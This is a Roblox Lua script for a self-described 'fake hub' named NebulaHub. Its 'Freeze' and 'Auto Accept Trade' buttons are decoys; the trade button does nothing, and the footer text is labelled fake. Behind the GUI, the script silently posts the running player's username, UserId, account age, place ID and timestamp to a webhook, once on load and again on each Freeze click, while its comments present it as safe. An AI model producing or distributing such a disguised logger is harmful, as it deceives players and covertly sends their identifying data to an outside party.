-- NebulaHub.lua
-- Safe, PC + APK compatible fake hub
-- Only logs LocalPlayer info

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Webhook URL (replace with your own test webhook)
local WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

-- Function to send executor info (safe, only LocalPlayer)
local function sendWebhook()
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            content = string.format(
                "NebulaHub Executed!\nUser: %s\nUserId: %d\nAccount Age: %d days\nPlace: %d\nTime: %s",
                player.Name,
                player.UserId,
                player.AccountAge,
                game.PlaceId,
                os.date("%Y-%m-%d %H:%M:%S")
            )
        }), Enum.HttpContentType.ApplicationJson)
    end)
end

-- GUI Creation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NebulaHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 220, 0, 130)
mainFrame.Position = UDim2.new(0, 20, 0, 20)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = ScreenGui
mainFrame.Active = true
mainFrame.Draggable = true

-- Hub title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "NebulaHub v1.0"
title.TextColor3 = Color3.fromRGB(200, 150, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

-- Freeze button
local freezeBtn = Instance.new("TextButton")
freezeBtn.Size = UDim2.new(0, 180, 0, 35)
freezeBtn.Position = UDim2.new(0, 20, 0, 40)
freezeBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 120)
freezeBtn.Text = "Freeze"
freezeBtn.TextColor3 = Color3.fromRGB(255,255,255)
freezeBtn.TextScaled = true
freezeBtn.Font = Enum.Font.GothamBold
freezeBtn.AutoButtonColor = true
freezeBtn.Parent = mainFrame

-- Auto Accept Trade button (does nothing)
local autoBtn = Instance.new("TextButton")
autoBtn.Size = UDim2.new(0, 180, 0, 35)
autoBtn.Position = UDim2.new(0, 20, 0, 80)
autoBtn.BackgroundColor3 = Color3.fromRGB(50,50,100)
autoBtn.Text = "Auto Accept Trade"
autoBtn.TextColor3 = Color3.fromRGB(255,255,255)
autoBtn.TextScaled = true
autoBtn.Font = Enum.Font.GothamBold
autoBtn.AutoButtonColor = true
autoBtn.Parent = mainFrame

-- Freeze logic
local function freezePlayer(duration)
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end

    -- Anchor root part
    hrp.Anchored = true

    -- Try disabling controls (PC only)
    local success, playerModule = pcall(function()
        return require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
    end)
    if success then
        local controls = playerModule:GetControls()
        controls:Disable()
    end

    wait(duration)

    hrp.Anchored = false
    if success then
        local controls = playerModule:GetControls()
        controls:Enable()
    end
end

-- Button functionality
freezeBtn.MouseButton1Click:Connect(function()
    freezePlayer(math.random(5,7))
    sendWebhook() -- send info when Freeze is clicked
end)

autoBtn.MouseButton1Click:Connect(function()
    -- does nothing, just for looks
end)

-- Fake legit text at bottom
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 15)
footer.Position = UDim2.new(0, 0, 0, 115)
footer.BackgroundTransparency = 1
footer.Text = "NebulaHub v1.0 | Made for testing | Debug OK"
footer.TextColor3 = Color3.fromRGB(180,180,180)
footer.TextScaled = true
footer.Font = Enum.Font.Gotham
footer.Parent = mainFrame

-- Optional: Send webhook immediately on load
sendWebhook()
